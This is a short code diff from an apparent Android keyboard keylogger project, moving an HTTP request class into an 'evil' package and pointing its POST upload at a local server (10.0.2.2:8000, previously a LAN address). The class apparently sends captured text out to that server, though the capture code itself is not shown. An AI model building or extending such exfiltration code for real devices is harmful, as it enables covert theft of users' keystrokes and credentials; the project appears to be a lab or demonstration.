@@ -1,4 +1,4 @@
-package com.example.keyboard_keylogger;
+package com.example.keyboard_keylogger.evil;
 
 import android.os.AsyncTask;
 
@@ -15,11 +15,9 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 
-class HTTPReqTask extends AsyncTask<Void, Void, Void> {
+public class HTTPReqTask extends AsyncTask<Void, Void, Void> {
 
     private String body;
-
-
 
     public HTTPReqTask setBody(String b){
         this.body=b;
@@ -32,7 +30,7 @@ class HTTPReqTask extends AsyncTask<Void, Void, Void> {
        // try {
         URL url = null;
         try {
-            url = new URL("http://192.168.1.36:8000");
+            url = new URL("http://10.0.2.2:8000");
             int length = body.length();
             urlConnection = (HttpURLConnection) url.openConnection();
             urlConnection.setRequestMethod("POST");
